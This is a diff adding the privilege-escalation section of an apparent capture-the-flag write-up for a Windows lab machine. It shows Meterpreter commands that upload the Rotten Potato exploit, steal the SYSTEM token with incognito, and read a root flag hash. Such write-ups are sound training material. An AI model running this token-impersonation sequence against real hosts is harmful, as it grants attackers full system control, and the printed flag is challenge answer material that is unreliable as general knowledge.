@@ -359,10 +359,75 @@ Logged On Users : 5
 Meterpreter     : x64/windows
 ```
 
-Why do you spoil me Metasploit!!!!
+Why do you spoil me Metasploit!!!! :astonished:
 
+We know that there is MSSQL service running on the machine
 
-=> Root Potato Doh!
+MSSQL service + Windows Machine automatically rings the bell **Rotten Potato!**
+Resource: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075
+```
+meterpreter > pwd
+C:\TEMP
+meterpreter > upload potato.exe
+[*] uploading  : potato.exe -> potato.exe
+[*] uploaded   : potato.exe -> potato.exe
+meterpreter > use incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
 
+Delegation Tokens Available
+========================================
+NT SERVICE\SQLSERVERAGENT
+NT SERVICE\SQLTELEMETRY
+TALLY\Sarah
 
-![Alt test](https://media.giphy.com/media/hKNPxrffFH0GY/giphy.gif "Suuure")
+Impersonation Tokens Available
+========================================
+No tokens available
+
+meterpreter > execute -cH -f ./potato.exe
+Process 8140 created.
+Channel 3 created.
+meterpreter > list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+NT SERVICE\SQLSERVERAGENT
+NT SERVICE\SQLTELEMETRY
+TALLY\Sarah
+
+Impersonation Tokens Available
+========================================
+NT AUTHORITY\SYSTEM
+
+meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[-] No delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+Feelsgoodman :grin:
+
+**root.txt**
+
+```
+meterpreter > ls
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-08-30 11:47:47 +0530  desktop.ini
+100444/r--r--r--  32    fil   2017-08-31 06:33:03 +0530  root.txt
+
+meterpreter > cat root.txt
+608bb707348105911c8991108e523eda
+```
+
